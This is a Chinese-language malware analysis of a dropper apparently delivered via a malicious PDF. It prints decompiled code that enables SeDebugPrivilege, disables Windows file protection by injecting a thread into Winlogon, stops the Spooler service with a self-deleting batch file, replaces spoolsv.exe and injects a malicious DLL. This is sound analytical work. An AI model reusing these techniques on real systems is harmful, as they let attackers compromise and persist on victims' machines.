
# 代码分析

``` 
  memset(CmdLine, 0, sizeof(CmdLine));

  v16 = 0;

  v17 = 0;

  sprintf(CmdLine, "%s /c echo 12345>%s", v21, Buffer);// 格式化输出

                                                // C:\WINDOWS\system32\cmd.exe /c echo 12345>C:\WINDOWS\system32\setup\hid128.log

  WinExec(CmdLine, 0);

  Sleep(0xBB8u);

  FileA = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0x10000080u, 0);

  if ( FileA == (HANDLE)-1 )

  {

    v10 = 0;

  }

  else

  {

    CloseHandle(FileA);

    v10 = 1;

  }

  if ( v10 )
    sub_402180();                               // 关闭文件保护函数

  memset(Filename, 0, sizeof(Filename));

  v19 = 0;

  v20 = 0;

  GetModuleFileNameA(0, Filename, 0x104u);

  if ( !sub_402210(Filename) )
  {
    sub_40321D("Not configed, exit...\r\n");
    return -1;
  }

  v12 = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0x10000080u, 0);

  if ( v12 == (HANDLE)-1 )
  {
    v13 = 0;
  }
  else
  {
    CloseHandle(v12);
    v13 = 1;
  }

  if ( !v13 )
    return -1;

  GetSystemDirectoryA(::Buffer, 0x104u);
  *(_WORD *)&::Buffer[strlen(::Buffer)] = 92;
  strcat(::Buffer, "spoolss.dll");

  GetSystemDirectoryA(byte_4127E8, 0x104u);
  *(_WORD *)&byte_4127E8[strlen(byte_4127E8)] = 92;

  GetSystemDirectoryA(byte_4128F0, 0x104u);
  strcat(byte_4128F0, "\\Setup\\");

  GetSystemDirectoryA(byte_4129F8, 0x104u);
  strcat(byte_4129F8, "\\catroot\\");

  strcat(ExistingFileName, byte_4127E8);
  strcat(ExistingFileName, aSpoolsvExe);
  strcat(byte_412C08, byte_4127E8);
  strcat(byte_412C08, aSpoolerExe);
  strcat(byte_412D10, byte_4128F0);
  strcat(byte_412D10, aSetjupryExe);
  strcat(NewFileName, byte_4128F0);
  strcat(NewFileName, aFxjssocmExe);
  strcat(byte_412F20, byte_4127E8);
  strcat(byte_412F20, aMsxml0rDll);
  strcat(FileName, byte_4127E8);
  strcat(FileName, aMsxml0Dll);
  strcat(byte_413130, byte_4128F0);
  strcat(byte_413130, aMsxm32Dll);

  ms_exc.registration.TryLevel = 0;
  sub_401FA0(ServiceName);

  dword_413234 = sub_401A00(byte_413130);

  if ( dword_413234 )
  {
    v14 = (void (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;
    MoveFileExA(ExistingFileName, byte_412C08, 3u);
    CopyFileA(NewFileName, ExistingFileName, 0);
    if ( sub_401000(ExistingFileName, (int)aMsxml0rDll, (int)aEntrypoint) == 1 )
      sub_40321D("Install Again Successfully!\r\n");
    else
      sub_40321D("Install Again Failed!\r\n");
    sub_401CE0(ExistingFileName, ::Buffer);
  }
  else
  {
    CopyFileA(ExistingFileName, NewFileName, 0);
    v14 = (void (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;
    MoveFileExA(ExistingFileName, byte_412C08, 3u);
    CopyFileA(NewFileName, ExistingFileName, 0);
    if ( sub_401000(ExistingFileName, (int)aMsxml0rDll, (int)aEntrypoint) == 1 )
      sub_40321D("New Install Successfully!\r\n");
    else
      sub_40321D("New Install Failed!\r\n");
    CopyFileA(ExistingFileName, byte_412D10, 0);
    CopyFileA(::Buffer, byte_413130, 0);
    sub_401D70(byte_4128F0, byte_4129F8);
    sub_401CE0(ExistingFileName, ::Buffer);
  }

  sub_401AD0(ServiceName);

  if ( sub_401A00(byte_412F20) )
  {
    if ( sub_401A00(FileName) )
      DeleteFileA(FileName);
    v14(byte_412F20, FileName, 3u);
    sub_402110(byte_412F20, &unk_40B148, 0x6E00u);
    sub_4023F0(byte_412F20);
    if ( sub_401CE0(byte_412F20, ::Buffer) )
      sub_40321D("Upgrade Success!\r\n");
    else
      sub_40321D("Upgrade Failed!\r\n");
  }
  else
  {
    sub_402110(byte_412F20, &unk_40B148, 0x6E00u);
    sub_4023F0(byte_412F20);
    sub_401CE0(byte_412F20, ::Buffer);
    sub_401CE0(ExistingFileName, ::Buffer);
  }

  ms_exc.registration.TryLevel = -1;
  sub_401E20(ServiceName);
  sub_401B70(4205738);
  return 1;
}
```
可以看到该函数首先是创建了一个`log`文件，然后输出`12345`到其中，之后我们进入注释的关闭文件保护函数，点击查看

``` 
int __thiscall sub_402180(void *this)
{
  HMODULE v1; // esi
  unsigned __int16 Version; // ax
  __int16 v3; // ax
  HMODULE LibraryA; // eax
  DWORD (__stdcall *ProcAddress)(LPVOID); // esi
  void *v6; // eax
  HANDLE v7; // eax
  DWORD ThreadId; // [esp+0h] [ebp-4h] BYREF

  ThreadId = (DWORD)this;
  sub_4016F0();                                 // 提权函数，启用SeDebugPreviledge
  sub_401780("Winlogon.exe");
  v1 = 0;
  Version = GetVersion();
  if ( (_BYTE)Version == 5 )
  {
    v3 = HIBYTE(Version);
    if ( !(_BYTE)v3 )
    {
      LibraryA = LoadLibraryA("sfc.dll");
LABEL_7:
      v1 = LibraryA;
      goto LABEL_8;
    }
    if ( (_BYTE)v3 == 1 || (_BYTE)v3 == 2 )
    {
      LibraryA = LoadLibraryA("sfc_os.dll");
      goto LABEL_7;
    }
  }
LABEL_8:
  ProcAddress = (DWORD (__stdcall *)(LPVOID))GetProcAddress(v1, (LPCSTR)2);
  ThreadId = 0;
  v6 = (void *)sub_4018B0("Winlogon.exe");
  v7 = CreateRemoteThread(v6, 0, 0, ProcAddress, 0, 0, &ThreadId);
  WaitForSingleObject(v7, 0xFA0u);
  return 0;
}
```
其中函数`sub_4016F0()`是一个典型的提权函数，他的名字应该是`ElvatePriviledge`,他的作用是获取 `SeDebugPrivilege` 权限并设置 `SE_PRIVILEGE_ENABLED` 属性来开启权限，这里没符号表很难受,跟进查看如下

``` 
int sub_4016F0()
{
  HANDLE CurrentProcess; // eax
  HANDLE TokenHandle; // [esp+0h] [ebp-1Ch] BYREF
  struct _LUID Luid; // [esp+4h] [ebp-18h] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-10h] BYREF
  CurrentProcess = GetCurrentProcess();

  if ( !OpenProcessToken(CurrentProcess, 0x28u, &TokenHandle) )
    return 0;

  if ( !LookupPrivilegeValueA(0, "SeDebugPrivilege", &Luid) )
  {
    CloseHandle(TokenHandle);
    return 0;
  }

  NewState.Privileges[0].Luid = Luid;
  NewState.PrivilegeCount = 1;
  NewState.Privileges[0].Attributes = 2;

  AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, 0, 0);
  CloseHandle(TokenHandle);
  return 1;
}
```
然后回到主函数，该函数会串讲停止打印服务脚本并且运行,这里会有一个字符串`Spooler`

![](http://imgsrc.baidu.com/forum/pic/item/86d6277f9e2f070884b338caac24b899a801f242.jpg)

![](http://imgsrc.baidu.com/forum/pic/item/d4628535e5dde7118d62513ce2efce1b9c166143.jpg)

，我们用`OD`进行动态调试

![](http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2904b4c804dc25bc315d607cff.jpg)

我们跟进查看

![](http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9815f29137c01213fb90e918d.jpg)

可以看到他会创建一个`Temp_unstop.bat`,然后我们写入内容

```
net stop "Spooler"
net stop "Spooler"
del "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\_unstop.bat"
```
他是为了关闭`Spooler`服务，然后删除自己。

``` 
void __cdecl sub_401FA0(const char *a1)
{
  char *v1; // edi
  HANDLE FileA; // esi
  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-61Ch] BYREF
  CHAR Buffer[257]; // [esp+18h] [ebp-618h] BYREF
  __int16 v6; // [esp+119h] [ebp-517h]
  char v7; // [esp+11Bh] [ebp-515h]
  CHAR Filename[257]; // [esp+120h] [ebp-510h] BYREF
  __int16 v9; // [esp+221h] [ebp-40Fh]
  char v10; // [esp+223h] [ebp-40Dh]
  CHAR v11[1021]; // [esp+228h] [ebp-408h] BYREF
  __int16 v12; // [esp+625h] [ebp-Bh]
  char v13; // [esp+627h] [ebp-9h]

  memset(Buffer, 0, sizeof(Buffer));
  v6 = 0;
  v7 = 0;
  GetTempPathA(0x104u, Buffer);
  v1 = (char *)&NumberOfBytesWritten + 3;
  while ( *++v1 )
    ;
  strcpy(v1, "_unstop.bat");

  memset(Filename, 0, sizeof(Filename));
  v9 = 0;
  v10 = 0;
  GetModuleFileNameA(0, Filename, 0x104u);

  FileA = CreateFileA(Buffer, 0xC0000000, 1u, 0, 2u, 0x10000080u, 0);

  if ( FileA != (HANDLE)-1 )
  {
    memset(v11, 0, sizeof(v11));
    v12 = 0;
    v13 = 0;
    wsprintfA(v11, "net stop \"%s\"\r\nnet stop \"%s\"\r\ndel \"%s\" \r\n", a1, a1, Buffer);
    NumberOfBytesWritten = 0;
    WriteFile(FileA, v11, strlen(v11), &NumberOfBytesWritten, 0);
    CloseHandle(FileA);
    ShellExecuteA(0, "open", Buffer, 0, 0, 0);
    Sleep(0x1388u);
  }
}
```
之后我就不细讲了，这里涉及到的知识越来越难懂了，写了没什么意义，总的来说就是，`svrhost.exe`文件会在系统目录下生成其他病毒文件，同时篡改系统文件，然后他也会创建一系列`bat`批处理文件，要么是关闭服务，要么是删除自身以及病毒痕迹，或者说是加载恶意`DLL`，而该注入的恶意`DLL`文件就是`msxml0r.dll`文件.

![](http://imgsrc.baidu.com/forum/pic/item/1ad5ad6eddc451daea701121f3fd5266d1163271.jpg)

他经过`PECompact`加壳处理，他会得到3个`URL`地址然后不断发送`HTTP`请求，下载3个`gif`文件，可以猜测这三个`gif`文件中包含一些`PE`数据，用来执行恶意操作。最后我们的`shellcode`将会把`PDF`样本修改为正常文件，也就是删除了`TTF`字体的`SING`表。

可以看到`PDF`正常打开

![](http://imgsrc.baidu.com/forum/pic/item/9825bc315c6034a8716aa54b8e1349540823766b.jpg)
